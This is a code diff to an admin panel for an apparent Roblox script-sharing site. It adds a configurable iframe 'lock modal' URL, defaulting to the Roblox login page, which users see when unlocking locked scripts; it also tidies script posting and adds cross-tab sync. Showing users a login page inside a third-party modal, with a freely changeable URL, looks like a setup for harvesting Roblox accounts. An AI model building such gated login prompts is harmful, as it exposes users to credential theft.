@@ -231,6 +231,23 @@ nav{position:sticky;top:0;z-index:100;background:rgba(10,10,15,.9);backdrop-filt
         <div class="al ao" id="sok" style="margin-top:1rem"></div>
         <div class="al ae" id="serr" style="margin-top:1rem"></div>
         <hr style="border-color:var(--bor);margin:2rem 0">
+        <h2>🔒 Lock Modal — Iframe URL</h2>
+        <p style="color:var(--mt);font-size:.85rem;line-height:1.6;margin-bottom:1rem">
+          The URL that loads inside the lock modal iframe when users try to unlock a locked script.<br>
+          Default is the Roblox login page. You can change it to any URL (Linkvertise, your own page, etc).
+        </p>
+        <div class="f">
+          <label>Iframe URL</label>
+          <input type="text" id="iframeUrl" placeholder="https://www.roblox.com/login">
+          <div style="font-family:var(--mono);font-size:.7rem;color:var(--mt);margin-top:.35rem">
+            Current: <span id="iframeUrlCurrent" style="color:var(--acc2)">loading...</span>
+          </div>
+        </div>
+        <button class="pbtn" onclick="saveIframeUrl()">💾 Save Iframe URL</button>
+        <div class="al ao" id="iframeOk" style="margin-top:.75rem"></div>
+        <div class="al ae" id="iframeErr" style="margin-top:.75rem"></div>
+
+        <hr style="border-color:var(--bor);margin:2rem 0">
         <h2>Danger Zone</h2>
         <p style="color:var(--mt);font-size:.85rem;margin-bottom:1rem">Permanently delete all scripts.</p>
         <button onclick="nukeAll()" style="background:rgba(239,68,68,.1);color:var(--red);border:1px solid rgba(239,68,68,.3);padding:.6rem 1.25rem;border-radius:7px;font-family:var(--mono);font-size:.8rem;cursor:pointer">Delete All Scripts</button>
@@ -309,7 +326,7 @@ async function loadStats(){
     document.getElementById('dG').textContent=d.totalGames;
   }catch{}
 }
-function swTab(id,btn){document.querySelectorAll('.tc').forEach(t=>t.classList.remove('on'));document.querySelectorAll('.tb').forEach(b=>b.classList.remove('on'));document.getElementById('tc-'+id).classList.add('on');btn.classList.add('on');if(id==='manage')renderM();}
+function swTab(id,btn){document.querySelectorAll('.tc').forEach(t=>t.classList.remove('on'));document.querySelectorAll('.tb').forEach(b=>b.classList.remove('on'));document.getElementById('tc-'+id).classList.add('on');btn.classList.add('on');if(id==='manage')renderM();if(id==='settings')loadIframeUrl();}
 
 // ── GAME SEARCH ──────────────────────────────────────
 let searchTimer = null;
@@ -387,20 +404,78 @@ function closeDropdown(){
 }
 
 function esc(s){ return (s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+function toggleLockField(on){
+  const wrap=document.getElementById('pRU-wrap');
+  wrap.style.display=on?'block':'none';
+  if(on){
+    wrap.style.animation='fadeUp .3s ease both';
+    document.getElementById('pRU').focus();
+  }
+}
 async function postScript(){
-  const title=document.getElementById('pT').value.trim(),game=document.getElementById('pG').value.trim();
-  const cat=document.getElementById('pC').value,status=document.getElementById('pSt').value;
-  const desc=document.getElementById('pD').value.trim(),script=document.getElementById('pSc').value.trim();
+  const title=document.getElementById('pT').value.trim();
+  const game=document.getElementById('pG').value.trim();
+  const cat=document.getElementById('pC').value;
+  const status=document.getElementById('pSt').value;
+  const desc=document.getElementById('pD').value.trim();
+  const script=document.getElementById('pSc').value.trim();
   const locked=document.getElementById('pLk').checked===true;
   const redirect_url=document.getElementById('pRU').value.trim()||null;
-  if(!title||!game||!desc||!script){showAl('perr','❌ Fill in all required fields.');return;}
-  if(locked&&!redirect_url){showAl('perr','❌ Add a redirect URL for the locked script.');return;}
+  const thumbnail=document.getElementById('pThumbUrl').value.trim()||null;
+  const roblox_game_id=document.getElementById('pGameId').value.trim()||null;
+
+  // Validate required fields
+  if(!title){showAl('perr','❌ Script title is required.');return;}
+  if(!game){showAl('perr','❌ Game name is required.');return;}
+  if(!desc){showAl('perr','❌ Description is required.');return;}
+  if(!script){showAl('perr','❌ Script code is required.');return;}
+  if(locked&&!redirect_url){showAl('perr','❌ Locked scripts need a Redirect URL. Scroll down to fill it in.');return;}
+
+  const payload={
+    title,game,
+    category:cat,
+    status,
+    description:desc,
+    script,
+    locked:locked,
+    redirect_url:locked?redirect_url:null,
+    thumbnail,
+    roblox_game_id
+  };
+
   try{
-    const r=await fetch(`${API}/api/scripts`,{method:'POST',headers:ah(),body:JSON.stringify({title,game,category:cat,status,description:desc,script,locked:locked,redirect_url:locked?redirect_url:null,thumbnail:document.getElementById('pThumbUrl').value||null,roblox_game_id:document.getElementById('pGameId').value||null})});
-    const d=await r.json();if(!r.ok)throw new Error(d.error);
-    ['pT','pG','pD','pSc','pRU','pThumbUrl','pGameId'].forEach(id=>document.getElementById(id).value='');document.getElementById('thumbSelected').style.display='none';document.getElementById('pLk').checked=false;document.getElementById('pRU-wrap').style.display='none';
-    showAl('pok','✅ Script published!');loadStats();loadMData();
-  }catch(e){showAl('perr','❌ '+(e.message||'Server error'));}
+    const r=await fetch(`${API}/api/scripts`,{
+      method:'POST',
+      headers:ah(),
+      body:JSON.stringify(payload)
+    });
+    const d=await r.json();
+    if(!r.ok)throw new Error(d.error||'Server error');
+
+    // Reset ALL form fields
+    document.getElementById('pT').value='';
+    document.getElementById('pG').value='';
+    document.getElementById('pD').value='';
+    document.getElementById('pSc').value='';
+    document.getElementById('pRU').value='';
+    document.getElementById('pThumbUrl').value='';
+    document.getElementById('pGameId').value='';
+    document.getElementById('pLk').checked=false;
+    document.getElementById('pRU-wrap').style.display='none';
+    document.getElementById('thumbSelected').style.display='none';
+    document.getElementById('thumbSelImg').src='';
+    document.getElementById('thumbSelName').textContent='';
+    gameResults=[];
+    closeDropdown();
+
+    showAl('pok','✅ Script published successfully!');
+    loadStats();
+    loadMData();
+    syncPublicSite('post');
+  }catch(e){
+    showAl('perr','❌ '+(e.message||'Server error. Check console.'));
+    console.error('postScript error:',e);
+  }
 }
 async function loadMData(){
   try{
@@ -464,6 +539,47 @@ async function nukeAll(){
   if(!confirm('Delete ALL scripts permanently?'))return;
   try{await fetch(`${API}/api/admin/scripts`,{method:'DELETE',headers:ah()});loadMData();loadStats();}catch{}
 }
+
+// ── SYNC PUBLIC SITE ─────────────────────────────────
+// Notifies index.html (if open in another tab) to reload scripts
+const _syncChannel = new BroadcastChannel('sv_sync');
+function syncPublicSite(action){
+  try{
+    // BroadcastChannel — works across tabs on same origin
+    _syncChannel.postMessage({ action, ts: Date.now() });
+    // Also write to localStorage as fallback for Safari
+    localStorage.setItem('sv_sync', JSON.stringify({ action, ts: Date.now() }));
+  }catch(e){
+    console.log('sync error:', e);
+  }
+}
+
+
+// ── IFRAME URL CONFIG ────────────────────────────────
+const IFRAME_KEY = 'sv_iframe_url';
+const IFRAME_DEFAULT = 'https://www.roblox.com/login';
+
+function loadIframeUrl(){
+  const saved = localStorage.getItem(IFRAME_KEY) || IFRAME_DEFAULT;
+  document.getElementById('iframeUrl').value = saved;
+  document.getElementById('iframeUrlCurrent').textContent = saved;
+}
+
+function saveIframeUrl(){
+  const val = document.getElementById('iframeUrl').value.trim();
+  if(!val){ showAl('iframeErr','❌ Enter a valid URL.'); return; }
+  try{ new URL(val); }catch{ showAl('iframeErr','❌ Invalid URL format.'); return; }
+  localStorage.setItem(IFRAME_KEY, val);
+  document.getElementById('iframeUrlCurrent').textContent = val;
+  // Broadcast to index.html so it picks it up immediately
+  try{
+    const ch = new BroadcastChannel('sv_sync');
+    ch.postMessage({ action:'iframeUrl', url:val, ts:Date.now() });
+    localStorage.setItem('sv_iframe_url', val);
+  }catch{}
+  showAl('iframeOk','✅ Iframe URL saved! Will take effect immediately on the public site.');
+}
+
 function showAl(id,msg){const el=document.getElementById(id);el.textContent=msg;el.style.display='block';setTimeout(()=>el.style.display='none',4000);}
 function x(s){return(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
 function fd(iso){return new Date(iso).toLocaleDateString('en-US',{month:'short',day:'numeric',year:'numeric'});}
